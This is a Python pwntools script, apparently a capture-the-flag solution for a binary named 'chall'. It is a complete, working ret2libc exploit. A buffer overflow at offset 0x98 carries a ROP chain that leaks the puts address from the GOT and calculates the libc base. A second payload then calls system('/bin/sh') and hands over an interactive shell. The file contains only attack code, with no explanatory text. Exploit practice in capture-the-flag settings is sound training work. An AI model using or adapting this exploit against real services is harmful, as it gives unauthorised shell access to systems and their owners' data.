#!/usr/bin/env python3
from pwn import *

exe = ELF("./chall", checksec=False)
context.binary = exe
context.terminal = ['alacritty', '-e', 'bash', '-c']

libc = ELF("libc.so.6", checksec=False)

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)
    return r

def go_maintenance(r):
    r.recvuntil(b"> ")
    r.sendline(b"1")
    r.recvuntil(b"Please enter the access code:\n")

offset = 0x98

pop_rdi_ret = 0x000000000040114a
ret         = 0x000000000040101a

main_addr = exe.symbols["main"]   
puts_plt  = exe.plt["puts"]
puts_got  = exe.got["puts"]

def main():
    r = conn()
    go_maintenance(r)

    payload1 = flat(
        b"A" * offset,
        pop_rdi_ret,
        puts_got,
        ret,
        puts_plt,
        ret,  
        main_addr
    )
    r.send(payload1)

    r.recvuntil(b"Access code accepted. You may now enter commands.\n")

    leak_line = r.recvline().strip()
    leak_puts = u64(leak_line.ljust(8, b"\x00"))
    log.success(f"puts leak: {hex(leak_puts)}")

    libc.address = leak_puts - libc.symbols["puts"]
    log.success(f"libc base: {hex(libc.address)}")

    go_maintenance(r)
    system_addr = libc.symbols["system"]
    binsh_str   = next(libc.search(b"/bin/sh"))
    print(hex(system_addr))
    print(hex(binsh_str))



    payload2 = flat(
        b"A" * offset,
        pop_rdi_ret,
        binsh_str,
        ret,
        system_addr
    )
    r.send(payload2)

    r.interactive()

if __name__ == "__main__":
    main()
